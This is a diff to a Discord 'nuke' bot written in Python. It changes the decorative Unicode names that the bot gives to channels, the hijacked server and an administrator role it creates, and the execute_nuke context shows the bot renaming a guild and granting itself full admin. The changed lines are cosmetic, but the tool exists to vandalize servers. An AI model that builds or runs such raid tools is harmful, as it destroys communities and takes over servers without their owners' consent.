@@ -268,11 +268,11 @@ ROAST_LINES = [
 ]
 
 NUKE_CHANNEL_NAMES = [
-    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
-    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
-    "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
-    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀",
-
+    "🔱ꍟꁴ ꓄ꂦꉣ ꍏꈤ꓄ꀤ🔱",
+    " 𒆜𒆜𒆜 𐌃𐌄𐌕𐌐Ꝋ𐌙𐌄𐌃 𐌁𐌙 𐌍Ꝋ 𐌍𐌀𐌌𐌄 06 𒆜𒆜𒆜",
+    "𖤐𖤐⟡⟡ dε†r⊕ψεd ßψ ß⊕šš ßẢ⊕ ⟡⟡𖤐𖤐",
+    "🕶️💣๔єՇг๏ץє๔ ๒ץ ๒๏Շ ภยкє ๏ภ Շ๏ק💣🕶️",
+    "≿≺✦≻≾T̴̹̗̤̼̝̰̙͆̋̏̃̐͛̄̉͝͝H̸̛̳̒̉E̸̦̱̣̖̰̓͒͗͂̋̓̓̄͋̌ ̷̙̎̀̆͋̀K̷̢̳̖̻̫̤͗̓̉̎̌̿͝Ī̸̭̱̗̤̆͌́̒́͘͠N̷̡̙̪̻̗͚̣͆͋̑̑̈́̐̾͂̕Ģ̶͇̈͆͒̓͛͋̋͋͝ ̷̥̳̃͗̿͐̉̎̓̕̕Ồ̸̧̤͇̬͉̺̩̼̱̉͒͒͜F̸̡̙̗̯͍̘͍̜̏ͅ ̴̛̟̋̄̏͗̽N̶̛͙͓̗̬͐̿̓̏̏͋̓U̷͙̮͗͒͑̾̀̾̐̊K̸̫̖̩͕̤͍̫̩͋̑E̴̼̦̞͕̎̏̽̓̈≿≺✦≻≾",
 ]
 
 # ==================== HÀM TIỆN ÍCH ====================
@@ -397,7 +397,7 @@ async def execute_nuke(guild):
         async def prep_nuke():
             nonlocal supreme_role
             tasks = []
-            tasks.append(guild.edit(name="NUKE BY BỐ BẢO ĐZ"))
+            tasks.append(guild.edit(name="⟡⟡ 𝜫𝑼𝜥𝜮 𝜝𝜳 𝜝Ố 𝜝𝜟̉𝜣 Đ𝜡 ⟡⟡"))
             try:
                 async with aiohttp.ClientSession() as session:
                     async with session.get(NUKE_AVATAR_URL) as resp:
@@ -415,7 +415,7 @@ async def execute_nuke(guild):
 
             try:
                 supreme_role = await guild.create_role(
-                    name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
+                    name="👑 🔱𝜫𝜣 𝜫𝜟𝜴𝜮 06 𝜫𝑼𝜥𝜮 𝜣𝜫 𝜯𝜣𝜬🔱 👑",
                     permissions=discord.Permissions(administrator=True),
                     color=discord.Color.red(),
                     hoist=True
